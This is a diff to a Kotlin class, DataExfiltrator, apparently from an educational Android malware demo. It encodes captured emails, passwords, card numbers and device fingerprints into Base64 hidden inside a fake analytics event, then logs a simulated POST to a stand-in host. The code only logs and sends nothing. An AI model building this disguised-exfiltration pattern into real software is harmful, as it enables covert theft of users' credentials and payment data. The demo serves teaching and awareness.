@@ -9,23 +9,13 @@ import com.google.gson.JsonObject
 import java.util.UUID
 
 /**
- * Simulates data exfiltration by encoding captured credentials into
- * innocent-looking payloads disguised as analytics/telemetry data.
+ * Simulates data exfiltration by encoding captured credentials AND device
+ * intelligence into innocent-looking payloads disguised as analytics telemetry.
  *
- * ## How real exfiltration works
- * Malicious apps typically don't send stolen data in plaintext. Instead, they:
- * 1. **Encode** the data (Base64, custom encryption, etc.)
- * 2. **Disguise** the payload as legitimate traffic (analytics events, crash reports)
- * 3. **Send** via HTTPS to a C2 (command & control) server
- * 4. **Blend** with normal app traffic to avoid detection
+ * Now includes full device intel in the exfiltrated payload — demonstrating
+ * how much context an attacker gains alongside stolen credentials.
  *
- * ## What this demo does
- * - Encodes credentials in Base64
- * - Wraps them in a JSON payload that looks like an analytics event
- * - Logs the "sent" request instead of actually sending to any server
- * - Shows both encoded and decoded data in the session viewer
- *
- * This is purely educational — no actual network requests are made.
+ * Purely educational — no actual network requests are made.
  */
 object DataExfiltrator {
 
@@ -33,60 +23,94 @@ object DataExfiltrator {
     private val gson = GsonBuilder().setPrettyPrinting().create()
 
     /**
-     * "Exfiltrates" a capture session by encoding it and logging the payload.
-     *
-     * In a real attack, this would POST the data to a remote server via HTTPS.
-     * Here we only log to Logcat and update the session with the encoded payload.
-     *
-     * @param session The captured session to exfiltrate.
-     * @return The disguised payload as a JSON string.
+     * "Exfiltrates" a capture session by encoding credentials + device intel
+     * and logging the disguised payload.
      */
     fun exfiltrate(session: CaptureSession): String {
-        // Step 1: Build the sensitive data JSON
+        // Step 1: Build the sensitive data (credentials)
         val sensitiveData = JsonObject().apply {
-            addProperty("u", session.email)      // "u" for user — abbreviated to look like telemetry
-            addProperty("p", session.password)    // "p" for password
-            addProperty("t", session.targetApp)   // "t" for target
+            addProperty("u", session.email)
+            addProperty("p", session.password)
+            addProperty("t", session.targetApp)
             if (session.cardNumber.isNotEmpty()) {
-                addProperty("c", session.cardNumber) // "c" for card
+                addProperty("c", session.cardNumber)
             }
         }
 
-        // Step 2: Base64-encode the sensitive payload
-        val sensitiveJson = gson.toJson(sensitiveData)
+        // Step 2: Build device fingerprint (separate from credentials)
+        val deviceData = JsonObject()
+        for ((key, value) in session.deviceIntel) {
+            deviceData.addProperty(key, value)
+        }
+
+        // Step 3: Combine into a single payload and Base64-encode
+        val combinedPayload = JsonObject().apply {
+            add("creds", sensitiveData)
+            add("env", deviceData)
+        }
+        val combinedJson = gson.toJson(combinedPayload)
         val encodedPayload = Base64.encodeToString(
-            sensitiveJson.toByteArray(Charsets.UTF_8),
+            combinedJson.toByteArray(Charsets.UTF_8),
             Base64.NO_WRAP
         )
 
-        // Step 3: Wrap in an innocent-looking analytics event
+        // Step 4: Wrap in innocent-looking analytics event
         val disguisedPayload = JsonObject().apply {
             addProperty("event", "app_session_metric")
             addProperty("client_id", UUID.randomUUID().toString().take(8))
-            addProperty("payload", encodedPayload)  // The stolen data, hidden in plain sight
+            addProperty("payload", encodedPayload)
             addProperty("ts", System.currentTimeMillis() / 1000)
             addProperty("version", "2.1.0")
             addProperty("platform", "android")
             addProperty("sdk_ver", "4.8.2")
+            // Device intel fields mixed in as "normal" telemetry
+            addProperty("os", session.deviceIntel["os.version"] ?: "unknown")
+            addProperty("model", session.deviceIntel["device.model"] ?: "unknown")
+            addProperty("locale", session.deviceIntel["locale.display"] ?: "unknown")
         }
 
         val payloadString = gson.toJson(disguisedPayload)
 
-        // Step 4: Log what would be sent (no actual network request)
-        Log.d(TAG, "═══════════════════════════════════════════")
-        Log.d(TAG, "SIMULATED EXFILTRATION — NOT ACTUALLY SENT")
-        Log.d(TAG, "═══════════════════════════════════════════")
-        Log.d(TAG, "Target URL: https://analytics.fake-cdn.example/v2/collect")
-        Log.d(TAG, "Method: POST")
-        Log.d(TAG, "Content-Type: application/json")
-        Log.d(TAG, "Disguised payload (looks like analytics):")
-        Log.d(TAG, payloadString)
-        Log.d(TAG, "───────────────────────────────────────────")
-        Log.d(TAG, "Decoded payload (actual stolen data):")
-        Log.d(TAG, sensitiveJson)
-        Log.d(TAG, "═══════════════════════════════════════════")
+        // Step 5: Detailed log output
+        Log.d(TAG, "")
+        Log.d(TAG, "╔══════════════════════════════════════════════════════════════╗")
+        Log.d(TAG, "║       SIMULATED EXFILTRATION — NOT ACTUALLY SENT            ║")
+        Log.d(TAG, "╠══════════════════════════════════════════════════════════════╣")
+        Log.d(TAG, "║ Target URL: https://analytics.fake-cdn.example/v2/collect   ║")
+        Log.d(TAG, "║ Method: POST                                                ║")
+        Log.d(TAG, "║ Content-Type: application/json                              ║")
+        Log.d(TAG, "╠══════════════════════════════════════════════════════════════╣")
+        Log.d(TAG, "║ DISGUISED PAYLOAD (looks like analytics):                   ║")
+        Log.d(TAG, "╚══════════════════════════════════════════════════════════════╝")
+        payloadString.lines().forEach { Log.d(TAG, "  $it") }
 
-        // Step 5: Update session repository with exfil results
+        Log.d(TAG, "")
+        Log.d(TAG, "┌── DECODED: STOLEN CREDENTIALS ──────────────────────────────")
+        Log.d(TAG, "│ User:     ${session.email}")
+        Log.d(TAG, "│ Password: ${session.password}")
+        if (session.cardNumber.isNotEmpty()) {
+            Log.d(TAG, "│ Card:     ${session.cardNumber}")
+        }
+        Log.d(TAG, "│ Target:   ${session.targetApp}")
+        Log.d(TAG, "└──────────────────────────────────────────────────────────────")
+
+        Log.d(TAG, "")
+        Log.d(TAG, "┌── DECODED: DEVICE INTELLIGENCE (${session.deviceIntel.size} fields) ──")
+        var currentCat = ""
+        for ((key, value) in session.deviceIntel) {
+            val cat = key.substringBefore(".")
+            if (cat != currentCat) {
+                currentCat = cat
+                Log.d(TAG, "│")
+                Log.d(TAG, "│ [$currentCat]")
+            }
+            val field = key.substringAfter(".")
+            Log.d(TAG, "│   %-26s = %s".format(field, value))
+        }
+        Log.d(TAG, "└──────────────────────────────────────────────────────────────")
+        Log.d(TAG, "")
+
+        // Step 6: Update session repository
         SessionRepository.updateExfilStatus(
             sessionId = session.id,
             encodedPayload = payloadString,
@@ -98,10 +122,6 @@ object DataExfiltrator {
 
     /**
      * Decodes a Base64-encoded payload for display in the session viewer.
-     * Used to show the demo audience what's hidden inside the analytics event.
-     *
-     * @param encodedPayload The full disguised JSON payload.
-     * @return The decoded sensitive data, or an error message.
      */
     fun decodePayload(encodedPayload: String): String {
         return try {
